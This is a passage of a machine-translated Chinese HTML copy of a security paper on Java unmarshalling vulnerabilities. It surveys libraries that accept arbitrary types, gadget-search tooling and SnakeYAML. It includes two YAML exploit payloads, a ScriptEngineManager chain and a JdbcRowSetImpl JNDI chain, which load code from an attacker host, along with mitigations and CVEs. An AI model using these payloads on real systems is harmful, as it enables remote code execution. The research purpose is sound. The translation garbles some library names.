inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">29</font></font></font></nobr></div>
<div style="position:absolute;top:2981;left:167"><nobr><b><a href="https://translate.googleusercontent.com/translate_f#30"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6。结论</font></font></a></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:2981;left:709"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">30</font></font></b></nobr></div>
<div style="position:absolute;top:3713;left:443"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:3961;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="4"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 4 页</font></font></b></a></font></td></tr></tbody></table></div><font size="3" face="Times"><span style="font-size:19px;font-family:Times">
<div style="position:absolute;top:4119;left:167"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1 简介</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:4161;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">除了少数例外，Java 编组器</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">提供了转换它们各自的方法</font></font></nobr></div>
<div style="position:absolute;top:4179;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目标格式转换为对象图。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这允许用户使用结构化和</font></font></nobr></div>
<div style="position:absolute;top:4197;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正确类型的数据，当然是在 Java 中这样做的最自然的方式。</font></font></nobr></div>
<div style="position:absolute;top:4219;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在编组和解组期间，编组器需要与</font></font></nobr></div>
<div style="position:absolute;top:4237;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要检索/设置其属性的源/目标对象。</font><font style="vertical-align: inherit;">这种互动最</font></font></nobr></div>
<div style="position:absolute;top:4255;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通常基于 JavaBean 约定，这意味着访问对象属性</font></font></nobr></div>
<div style="position:absolute;top:4273;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过 getter（getXyz()，对于布尔值可能是 isXyz()）和 setter 方法</font></font></nobr></div>
<div style="position:absolute;top:4291;left:166"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(setXyz())。</font><font style="vertical-align: inherit;">其他机制直接访问实际的 Java 字段。</font><font style="vertical-align: inherit;">还有可能</font></font></nobr></div>
<div style="position:absolute;top:4309;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是对象生成其自身的自定义表示的一种机制，通常，</font></font></nobr></div>
<div style="position:absolute;top:4327;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了提高空间效率和/或增加表示能力，有</font></font></nobr></div>
<div style="position:absolute;top:4345;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一些不遵循这些规则的内置类型转换。</font></font></nobr></div>
<div style="position:absolute;top:4367;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">本文的重点是该过程的解组部分，因为它是</font></font></nobr></div>
<div style="position:absolute;top:4385;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">攻击者更有可能控制此过程的输入。</font><font style="vertical-align: inherit;">在</font></font><font color="#800000"><a href="https://translate.googleusercontent.com/translate_f#29"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 5 节</font></font></a></font></nobr></div>
<div style="position:absolute;top:4403;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示了一些可能的编组利用场景。</font></font></nobr></div>
<div style="position:absolute;top:4425;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在大多数情况下，在解组期间，预期的根对象类型是已知的</font></font></nobr></div>
<div style="position:absolute;top:4443;left:164"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">– 毕竟，人们可能想对收到的数据做些什么。</font><font style="vertical-align: inherit;">这个可以用</font></font></nobr></div>
<div style="position:absolute;top:4461;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用反射递归地确定属性类型。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">许多实现，</font></font></nobr></div>
<div style="position:absolute;top:4479;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">但是，已选择不完全或完全忽略该预期类型。</font><font style="vertical-align: inherit;">使用 Java</font></font></nobr></div>
<div style="position:absolute;top:4497;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">支持继承和接口还有允许多态的愿望</font></font></nobr></div>
<div style="position:absolute;top:4515;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这意味着需要将某种类型信息嵌入到</font></font></nobr></div>
<div style="position:absolute;top:4533;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">表示，以便可以恢复正确的表示。</font></font></nobr></div>
<div style="position:absolute;top:4555;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让攻击者有机会指定要解组的任意类型</font></font></nobr></div>
<div style="position:absolute;top:4573;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使他能够在该类型的对象上调用一组特定的方法。</font><font style="vertical-align: inherit;">很明显</font></font></nobr></div>
<div style="position:absolute;top:4591;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">期望这些人会表现得很好——可能会出现什么问题？</font></font></nobr></div>
<div style="position:absolute;top:4614;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开源 Java 编组库，在某些情况下——或曾经——允许</font></font></nobr></div>
<div style="position:absolute;top:4631;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">默认情况下，直接或在集合中的任意类型是：</font></font></nobr></div>
<div style="position:absolute;top:4653;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">• SnakeYAML (YAML)</font></font></nobr></div>
<div style="position:absolute;top:4675;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">• jYAML (YAML)</font></font></nobr></div>
<div style="position:absolute;top:4698;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">• YamlBeans (YAML)</font></font></nobr></div>
<div style="position:absolute;top:4720;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">• Apache Flex BlazeDS (AMF </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )</font></font></nobr></div>
<div style="position:absolute;top:4743;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">• Red5 IO AMF (AMF)</font></font></nobr></div>
<div style="position:absolute;top:4765;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">• json-io (JSON)</font></font></nobr></div>
<div style="position:absolute;top:4787;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">• 蓖麻 (XML)</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:6px;font-family:Times">
<div style="position:absolute;top:4827;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1</font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了避免与 Java 的内置序列化机制混淆，在整个文档中</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:4844;left:185"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“编组”是指任何将内部表示转换为可以</font></font></nobr></div>
<div style="position:absolute;top:4858;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">被转移或储存。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:6px;font-family:Times">
<div style="position:absolute;top:4870;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2</font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或者可能是树，如果机制不允许引用</font></font></font></nobr></div>
<div style="position:absolute;top:4884;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3</font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">抛开一些与类型擦除相关的特性，这对于集合来说根本不可能</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:4900;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于缺乏泛型，直到 Java 1.5</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:6px;font-family:Times">
<div style="position:absolute;top:4912;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Action Message Format，最初由Adobe开发</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:4975;left:443"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:5223;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="5"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 5 页</font></font></b></a></font></td></tr></tbody></table></div><font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:5385;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">• Java XMLDecoder (XML)</font></font></nobr></div>
<div style="position:absolute;top:5407;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">• Java 序列化（二进制）</font></font></nobr></div>
<div style="position:absolute;top:5429;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">• Kryo（二进制）</font></font></nobr></div>
<div style="position:absolute;top:5452;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">• 粗麻布/粗麻布（二进制/XML）</font></font></nobr></div>
<div style="position:absolute;top:5474;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">• XStream（XML/各种）</font></font></nobr></div>
<div style="position:absolute;top:5498;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Jackson 是一个实现的例子，它通常尊重实际的 prop-</font></font></nobr></div>
<div style="position:absolute;top:5516;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">erty 类型。</font><font style="vertical-align: inherit;">然而，它的多态解组支持有一个操作模式</font></font></nobr></div>
<div style="position:absolute;top:5533;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这确实允许任意类型。</font></font></nobr></div>
<div style="position:absolute;top:5574;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">没有这种行为的显着例外：</font></font></nobr></div>
<div style="position:absolute;top:5595;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">• JAXB 实现通常要求注册所有使用的类型。</font></font></nobr></div>
<div style="position:absolute;top:5618;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">• 需要模式定义或编译的机制（例如 XmlBeans、Jibx、</font></font></nobr></div>
<div style="position:absolute;top:5637;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">原型）。</font></font></nobr></div>
<div style="position:absolute;top:5658;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">• GSON 需要指定根类型、支持属性类型和机制</font></font></nobr></div>
<div style="position:absolute;top:5677;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">因为多态性需要注册。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5</font></font></font></nobr></div>
<div style="position:absolute;top:5698;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">• GWT-RPC 通常确实使用提供的类型信息，但会自动使用</font></font></nobr></div>
<div style="position:absolute;top:5717;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">建立白名单。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:19px;font-family:Times">
<div style="position:absolute;top:5767;left:167"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2 工装</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:5808;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">大多数小工具搜索都是使用稍微增强版的 Seriana 完成的——</font></font></nobr></div>
<div style="position:absolute;top:5826;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">莱泽。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Serianalyzer，最初是为Java反序列化分析而开发的，是一个静态的</font></font></nobr></div>
<div style="position:absolute;top:5844;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">字节码分析器，跟踪本机方法的（潜在）可达性</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开始</font></font></nobr></div>
<div style="position:absolute;top:5862;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从一组初始方法。</font><font style="vertical-align: inherit;">调整这些集合以匹配可以</font></font></nobr></div>
<div style="position:absolute;top:5880;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在解组</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">期间实现</font><font style="vertical-align: inherit;">它也可以应用于其他机制。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:6px;font-family:Times">
<div style="position:absolute;top:6075;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5</font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这显然并不能阻止任何人在</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:6091;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">它：</font></font><font color="#0000cc"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=http://stackoverflow.com/questions/17049684/convert-from-json-to-multiple-unknown-java-object-types-using-gson"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">http://stackoverflow </font></font></a></font><i><font color="#0000cc"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=http://stackoverflow.com/questions/17049684/convert-from-json-to-multiple-unknown-java-object-types-using-gson"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></a></font></i><font color="#0000cc"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=http://stackoverflow.com/questions/17049684/convert-from-json-to-multiple-unknown-java-object-types-using-gson"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">com/questions/17049684/convert-from-json-to-multiple-unknown-</font></font></a></font></nobr></div>
</span></font>
<font size="2" color="#0000cc" face="Times"><span style="font-size:9px;font-family:Times;color:#0000cc">
<div style="position:absolute;top:6107;left:186"><nobr><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=http://stackoverflow.com/questions/17049684/convert-from-json-to-multiple-unknown-java-object-types-using-gson"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">java-object-types-using-gson</font></font></a></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:6px;font-family:Times">
<div style="position:absolute;top:6118;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6</font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这有点不公平，因为它的编译器可以知道客户端代码。</font></font></font></nobr></div>
<div style="position:absolute;top:6132;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7</font></font><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=https://github.com/mbechler/serianalyzer/"></a><font color="#0000cc" style="font-size:9px"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=https://github.com/mbechler/serianalyzer/"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">https://github </font></font></a></font><i><font color="#0000cc" style="font-size:9px"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=https://github.com/mbechler/serianalyzer/"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></a></font></i><font color="#0000cc" style="font-size:9px"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=https://github.com/mbechler/serianalyzer/"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">com/mbechler/serianalyzer/</font></font></a></font></nobr></div>
<div style="position:absolute;top:6146;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8</font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">任何实际的系统交互都必须通过 Java 中的本机方法。</font></font></font></nobr></div>
<div style="position:absolute;top:6160;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9</font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并可能消除可序列化类型检查，以及针对 Java 调整的启发式方法</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:6177;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">序列化</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:6237;left:443"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:6485;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="6"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 6 页</font></font></b></a></font></td></tr></tbody></table></div><font size="3" face="Times"><span style="font-size:19px;font-family:Times">
<div style="position:absolute;top:6643;left:167"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3 编组库</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:6684;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此处描述的不同编组机制的不同之处在于它们的准确程度</font></font></nobr></div>
<div style="position:absolute;top:6702;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与要解组的对象交互以及它们对要解组的对象执行哪些检查。</font><font style="vertical-align: inherit;">这</font></font></nobr></div>
<div style="position:absolute;top:6720;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最根本的区别是它们如何在对象上设置值，因此</font></font></nobr></div>
<div style="position:absolute;top:6737;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">下面区分了使用 bean 属性访问的机制和</font></font></nobr></div>
<div style="position:absolute;top:6755;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">那些专门使用直接现场访问的。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:15px;font-family:Times">
<div style="position:absolute;top:6798;left:167"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.1 基于 Bean 属性的编组器</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:6831;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">基于 Bean 属性的编组器或多或少尊重类型的 API，防止</font></font></nobr></div>
<div style="position:absolute;top:6849;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">攻击者可以任意修改对象的状态，并且可以重构更少的对象</font></font></nobr></div>
<div style="position:absolute;top:6867;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图比基于现场的对应物。</font><font style="vertical-align: inherit;">然而，它们确实调用了 setter 方法</font></font></nobr></div>
<div style="position:absolute;top:6885;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这意味着在解组期间可以直接触发更多代码。</font></font></nobr></div>
<div style="position:absolute;top:6926;left:167"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.1.1 SnakeYAML</font></font></b></nobr></div>
<div style="position:absolute;top:6957;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SnakeYAML 只允许使用公共构造函数和</font></font></nobr></div>
<div style="position:absolute;top:6975;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">公共财产。</font><font style="vertical-align: inherit;">不需要对应的getter</font></font></nobr></div>
<div style="position:absolute;top:6993;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">方法。</font></font></nobr></div>
<div style="position:absolute;top:7015;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">它有一个特殊的功能，允许调用任意配置</font></font></nobr></div>
<div style="position:absolute;top:7033;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">具有攻击者提供的数据的构造函数。</font><font style="vertical-align: inherit;">这使得利用-</font></font></nobr></div>
<div style="position:absolute;top:7051;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ING</font></font><font color="#800000"><a href="https://translate.googleusercontent.com/translate_f#25"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的ScriptEngine</font></font></a></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可能的：</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10</font></font></font></nobr></div>
<div style="position:absolute;top:7081;left:178"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">!!javax.script.ScriptEngineManager [</font></font></nobr></div>
<div style="position:absolute;top:7099;left:197"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">!!java.net.URLClassLoader [[</font></font></nobr></div>
<div style="position:absolute;top:7117;left:216"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">!!java.net.URL ["http://attacker/"]</font></font></nobr></div>
<div style="position:absolute;top:7134;left:197"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">]]</font></font></nobr></div>
<div style="position:absolute;top:7152;left:178"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">]</font></font></nobr></div>
<div style="position:absolute;top:7188;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">仅使用属性访问它也可以被利用</font></font></nobr></div>
</span></font>
<font size="3" color="#800000" face="Times"><span style="font-size:12px;font-family:Times;color:#800000">
<div style="position:absolute;top:7206;left:167"><nobr><a href="https://translate.googleusercontent.com/translate_f#18"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">行集</font></font></a><font color="#000000"><a href="https://translate.googleusercontent.com/translate_f#18"></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:7235;left:178"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">!!com.sun.rowset.JdbcRowSetImpl</font></font></nobr></div>
<div style="position:absolute;top:7253;left:197"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数据源名称：ldap://攻击者/obj</font></font></nobr></div>
<div style="position:absolute;top:7271;left:197"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">自动提交：真</font></font></nobr></div>
<div style="position:absolute;top:7306;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SnakeYAML 允许指定一个根类型，它实际上是</font></font></nobr></div>
<div style="position:absolute;top:7324;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用过的。</font><font style="vertical-align: inherit;">但是，嵌套属性不进行类型检查。</font></font></nobr></div>
<div style="position:absolute;top:7350;left:174"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">减轻</font></font></b></nobr></div>
<div style="position:absolute;top:7382;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SnakeYAML 带有一个 SafeConstructor，不允许-</font></font></nobr></div>
<div style="position:absolute;top:7400;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">所有自定义类型。</font><font style="vertical-align: inherit;">或者，白名单可以是</font></font></nobr></div>
<div style="position:absolute;top:7418;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用自定义构造函数实现</font></font></nobr></div>
<div style="position:absolute;top:7436;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">重刑。</font></font></nobr></div>
<div style="position:absolute;top:6970;left:564"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参考</font></font></b></nobr></div>
<div style="position:absolute;top:7000;left:564"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CVE-2016-9606</font></font></b></nobr></div>
<div style="position:absolute;top:7018;left:602"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">高枕无忧</font></font></nobr></div>
<div style="position:absolute;top:7048;left:564"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CVE-2017-3159</font></font></b></nobr></div>
<div style="position:absolute;top:7066;left:601"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">阿帕奇骆驼</font></font></nobr></div>
<div style="position:absolute;top:7095;left:564"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CVE-2016-8744</font></font></b></nobr></div>
<div style="position:absolute;top:7113;left:601"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">阿帕奇布鲁克林</font></font></nobr></div>
<div style="position:absolute;top:7158;left:564"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">适用有效载荷</font></font></b></nobr></div>
</span></font>
<font size="3" color="#800000" face="Times"><span style="font-size:12px;font-family:Times;color:#800000">
<div style="position:absolute;top:7192;left:572"><nobr><a href="https://translate.googleusercontent.com/translate_f#25"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">脚本引擎 (4.16)</font></font></a></nobr></div>
<div style="position:absolute;top:7222;left:572"><nobr><a href="https://translate.googleusercontent.com/translate_f#18"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">JdbcRowset (4.2)</font></font></a></nobr></div>
<div style="position:absolute;top:7251;left:572"><nobr><a href="https://translate.googleusercontent.com/translate_f#21"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C3P0RefDS (4.8)</font></font></a></nobr></div>
<div style="position:absolute;top:7281;left:572"><nobr><a href="https://translate.googleusercontent.com/translate_f#21"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C3P0WrapDS (4.9)</font></font></a></nobr></div>
<div style="position:absolute;top:7311;left:572"><nobr><a href="https://translate.googleusercontent.com/translate_f#22"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SpringPropFac (4.10)</font></font></a></nobr></div>
<div style="position:absolute;top:7341;left:572"><nobr><a href="https://translate.googleusercontent.com/translate_f#21"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">JNDIConfig (4.7)</font></font></a></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:6px;font-family:Times">
<div style="position:absolute;top:7472;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10</font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">甚至更多，这似乎是一个令人难以置信的攻击面</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:7499;left:443"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6</font></font></nobr></div>
</span></font>

